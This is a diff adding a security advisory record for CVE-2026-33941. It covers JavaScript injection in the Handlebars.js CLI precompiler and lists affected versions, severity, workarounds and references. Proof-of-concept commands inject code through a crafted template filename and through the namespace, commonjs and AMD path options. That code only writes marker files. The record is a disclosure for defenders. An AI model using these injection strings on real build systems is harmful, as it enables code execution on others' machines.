@@ -1,0 +1,194 @@
+advisory_id: GHSA-xjpj-3mr7-gcpf
+datasource_id: github_osv/GHSA-xjpj-3mr7-gcpf
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-xjpj-3mr7-gcpf/GHSA-xjpj-3mr7-gcpf.json
+aliases:
+  - CVE-2026-33941
+summary: |
+  Handlebars.js has JavaScript Injection in CLI Precompiler via Unescaped Names and Options
+  ## Summary
+
+  The Handlebars CLI precompiler (`bin/handlebars` / `lib/precompiler.js`) concatenates user-controlled strings — template file names and several CLI options — directly into the JavaScript it emits, without any escaping or sanitization. An attacker who can influence template filenames or CLI arguments can inject arbitrary JavaScript that executes when the generated bundle is loaded in Node.js or a browser.
+
+  ## Description
+
+  `lib/precompiler.js` generates JavaScript source by string-interpolating several values directly into the output. Four distinct injection points exist:
+
+  ### 1. Template name injection
+
+  ```javascript
+  // Vulnerable code pattern
+  output += 'templates["' + template.name + '"] = template(...)';
+  ```
+
+  `template.name` is derived from the file system path. A filename containing `"` or `'];` breaks out of the string literal and injects arbitrary JavaScript.
+
+  ### 2. Namespace injection (`-n` / `--namespace`)
+
+  ```javascript
+  // Vulnerable code pattern
+  output += 'var templates = ' + opts.namespace + ' = ' + opts.namespace + ' || {};';
+  ```
+
+  `opts.namespace` is emitted as raw JavaScript. Anything after a `;` in the value becomes an additional JavaScript statement.
+
+  ### 3. CommonJS path injection (`-c` / `--commonjs`)
+
+  ```javascript
+  // Vulnerable code pattern
+  output += 'var Handlebars = require("' + opts.commonjs + '");';
+  ```
+
+  `opts.commonjs` is interpolated inside double quotes with no escaping, allowing `"` to close the string and inject further code.
+
+  ### 4. AMD path injection (`-h` / `--handlebarPath`)
+
+  ```javascript
+  // Vulnerable code pattern
+  output += "define(['" + opts.handlebarPath + "handlebars.runtime'], ...)";
+  ```
+
+  `opts.handlebarPath` is interpolated inside single quotes, allowing `'` to close the array element.
+
+  All four injection points result in code that executes when the generated bundle is `require()`d or loaded in a browser.
+
+  ## Proof of Concept
+
+  **Template name vector (creates a file `pwned` on disk):**
+
+  ```bash
+  mkdir -p templates
+  printf 'Hello' > "templates/evil'] = (function(){require(\"fs\").writeFileSync(\"pwned\",\"1\")})(); //.handlebars"
+
+  node bin/handlebars templates -o out.js
+  node -e 'require("./out.js")'  # Executes injected code, creates ./pwned
+  ```
+
+  **Namespace vector:**
+
+  ```bash
+  node bin/handlebars templates -o out.js \
+    -n "App.ns; require('fs').writeFileSync('pwned2','1'); //"
+  node -e 'require("./out.js")'
+  ```
+
+  **CommonJS vector:**
+
+  ```bash
+  node bin/handlebars templates -o out.js \
+    -c 'handlebars"); require("fs").writeFileSync("pwned3","1"); //'
+  node -e 'require("./out.js")'
+  ```
+
+  **AMD vector:**
+
+  ```bash
+  node bin/handlebars templates -o out.js -a \
+    -h "'); require('fs').writeFileSync('pwned4','1'); // "
+  node -e 'require("./out.js")'
+  ```
+
+  ## Workarounds
+
+  - **Validate all CLI inputs** before invoking the precompiler. Reject filenames and option values  that contain characters with JavaScript string-escaping significance (`"`, `'`, `;`, etc.).
+  - **Use a fixed, trusted namespace string** passed via a configuration file rather than  command-line arguments in automated pipelines.
+  - **Run the precompiler in a sandboxed environment** (container with no write access to sensitive  paths) to limit the impact of successful exploitation.
+  - **Audit template filenames** in any repository or package that is consumed by an automated  build pipeline.
+impacted_packages:
+  - purl: pkg:npm/handlebars
+    affected_versions: vers:npm/>=4.0.0|<=4.7.8
+    fixed_versions: vers:npm/4.7.9
+    affected_packages:
+      - pkg:npm/handlebars@4.0.0
+      - pkg:npm/handlebars@4.0.1
+      - pkg:npm/handlebars@4.0.2
+      - pkg:npm/handlebars@4.0.3
+      - pkg:npm/handlebars@4.0.4
+      - pkg:npm/handlebars@4.0.5
+      - pkg:npm/handlebars@4.0.6
+      - pkg:npm/handlebars@4.0.7
+      - pkg:npm/handlebars@4.0.8
+      - pkg:npm/handlebars@4.0.9
+      - pkg:npm/handlebars@4.0.10
+      - pkg:npm/handlebars@4.0.11
+      - pkg:npm/handlebars@4.0.12
+      - pkg:npm/handlebars@4.0.13
+      - pkg:npm/handlebars@4.0.14
+      - pkg:npm/handlebars@4.1.0
+      - pkg:npm/handlebars@4.1.1
+      - pkg:npm/handlebars@4.1.2-0
+      - pkg:npm/handlebars@4.1.2
+      - pkg:npm/handlebars@4.2.0
+      - pkg:npm/handlebars@4.2.1
+      - pkg:npm/handlebars@4.2.2
+      - pkg:npm/handlebars@4.3.0
+      - pkg:npm/handlebars@4.3.1
+      - pkg:npm/handlebars@4.3.2
+      - pkg:npm/handlebars@4.3.3
+      - pkg:npm/handlebars@4.3.4
+      - pkg:npm/handlebars@4.3.5
+      - pkg:npm/handlebars@4.4.0
+      - pkg:npm/handlebars@4.4.1
+      - pkg:npm/handlebars@4.4.2
+      - pkg:npm/handlebars@4.4.3
+      - pkg:npm/handlebars@4.4.4
+      - pkg:npm/handlebars@4.4.5
+      - pkg:npm/handlebars@4.5.0
+      - pkg:npm/handlebars@4.5.1
+      - pkg:npm/handlebars@4.5.2
+      - pkg:npm/handlebars@4.5.3
+      - pkg:npm/handlebars@4.6.0
+      - pkg:npm/handlebars@4.7.0
+      - pkg:npm/handlebars@4.7.1
+      - pkg:npm/handlebars@4.7.2
+      - pkg:npm/handlebars@4.7.3
+      - pkg:npm/handlebars@4.7.4
+      - pkg:npm/handlebars@4.7.5
+      - pkg:npm/handlebars@4.7.6
+      - pkg:npm/handlebars@4.7.7
+      - pkg:npm/handlebars@4.7.8
+    fixed_packages:
+      - pkg:npm/handlebars@4.7.9
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/handlebars-lang/handlebars.js
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/handlebars-lang/handlebars.js
+        commit: 68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-xjpj-3mr7-gcpf/GHSA-xjpj-3mr7-gcpf.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+  - CWE-116
+  - CWE-79
+references:
+  - url: https://github.com/handlebars-lang/handlebars.js
+    reference_type:
+    reference_id:
+  - url: https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2
+    reference_type:
+    reference_id:
+  - url: https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-33941
+    reference_type:
+    reference_id: CVE-2026-33941
+  - url: https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xjpj-3mr7-gcpf
+    reference_type:
+    reference_id: GHSA-xjpj-3mr7-gcpf
+exploits: []
